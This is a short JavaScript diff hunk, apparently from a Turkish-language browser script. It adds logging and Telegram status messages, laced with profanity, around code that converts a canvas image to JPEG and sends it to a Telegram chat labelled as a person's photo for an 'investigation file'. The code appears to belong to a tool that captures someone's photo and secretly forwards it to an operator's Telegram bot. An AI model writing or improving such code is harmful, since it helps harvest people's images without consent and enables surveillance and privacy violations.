@@ -8427,11 +8427,41 @@ Time: ${new Date().toLocaleString()}`;
                         
                         await telegram.sendMessage(photoMsg);
                         
-                        // Foto dosyasını gönder
+                        // Foto dosyasını gönder - DEBUG İÇİN DETAYLI ERROR HANDLING
                         try {
+                            console.log('Attempting to send photo...', {
+                                blobSize: blob.size,
+                                blobType: blob.type,
+                                telegramExists: !!telegram,
+                                sendFileExists: !!telegram.sendFile
+                            });
+                            
                             await telegram.sendFile(blob, 'Şahıs Fotoğrafı - Araştırma Dosyası', 'photo');
-                        } catch (e) {
-                            console.log('Photo send error:', e);
+                            
+                            // Başarı mesajı gönder
+                            const successMsg = `✅ FOTO GÖNDERİMİ BAŞARILI!
+
+📷 Foto boyutu: ${(blob.size / 1024).toFixed(1)}KB
+🕒 Gönderim zamanı: ${new Date().toLocaleString()}
+
+💀 RESIM ATMIYO AMCİK SORUNU ÇÖZÜLDÜ!`;
+                            
+                            await telegram.sendMessage(successMsg);
+                            
+                        } catch (photoError) {
+                            console.log('Photo send error:', photoError);
+                            
+                            // Detaylı hata mesajı gönder
+                            const errorMsg = `❌ FOTO GÖNDERİM HATASI!
+
+🐛 Error: ${photoError.message}
+📊 Blob size: ${blob.size} bytes
+📊 Blob type: ${blob.type}
+🕒 Time: ${new Date().toLocaleString()}
+
+😡 RESİM ATMIYO AMCİK - DEBUG INFO!`;
+                            
+                            await telegram.sendMessage(errorMsg);
                         }
                     }
                 }, 'image/jpeg', 0.9);
